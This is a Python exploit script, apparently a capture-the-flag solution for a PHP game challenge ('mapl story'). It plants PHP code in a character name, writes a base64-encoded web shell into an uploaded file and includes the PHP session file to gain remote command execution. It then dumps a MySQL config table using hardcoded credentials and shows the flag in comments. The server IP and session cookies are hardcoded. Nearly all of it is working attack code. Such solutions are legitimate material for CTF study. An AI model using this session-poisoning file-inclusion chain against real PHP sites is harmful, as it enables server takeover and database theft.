# -*- coding: utf-8 -*-
# by https://findneo.github.io/

import requests, hashlib, base64


def change_name(character_name):
    payload = dict(name=character_name, submit='Edit')
    r = requests.post(url + "?page=setting.php", cookies=cookie, data=payload)


def give_pet(user_email):
    payload = dict(pet="babydragon", email=user_email, submit="Give")
    r = requests.post(url + '?page=admin.php', cookies=cookie, data=payload)
    return r.content


def command(cmd="testcmd"):
    payload = dict(command=cmd, submit="Send")
    r = requests.post(
        url + "?page=character.php", cookies=cookie, data=payload)


def shell(cmd='uname'):
    payload = dict(
        page="/var/lib/php/sessions/sess_" + cookie['PHPSESSID'], f=cmd)
    r = requests.get(url, cookies=cookie, params=payload)
    return r.content


# edit your cookie['PHPSESSID'] & user_email to run this script
url = "http://178.128.87.16/"
user_email = "ojbk@qq.com"
salt = 'ms_g00d_0ld_g4m3'
cookie = dict(
    PHPSESSID='8es749ivbfetvsmsc0ggthr2e5',
    _role='a2ae9db7fd12a8911be74590b99bc7ad1f2f6ccd2e68e44afbf1280349205054',
    a="php://filter/convert.base64-decode/resource=upload/%s/command.txt" %
    hashlib.md5(salt + user_email).hexdigest())
change_name('<?=include"$_COOKIE[a]')
# 修改用户名使读Session文件时包含进Cookie['a']，即command.txt得base64解码
cmd = base64.b64encode("<?=`$_GET[f]`;")  #'PD89YCRfR0VUW2ZdYDs='
command(cmd[:19])  # 往command.txt写入base64编码的shell，缺少最后一个等号也可正常解码
give_pet(user_email)  # 使Session文件中的action值为"Give $pet to  player $username"
cmd = "mysql -e'select * from mapl_config' -umapl_story_user -ptsu_tsu_tsu_tsu mapl_story"
print shell(cmd)
# mapl_salt      mapl_key        mapl_now_get_your_flag
# ms_g00d_0ld_g4m3        You_Never_Guess_This_Tsug0d_1337        MeePwnCTF{__Abus1ng_SessioN_Is_AlwAys_C00L_1337!___}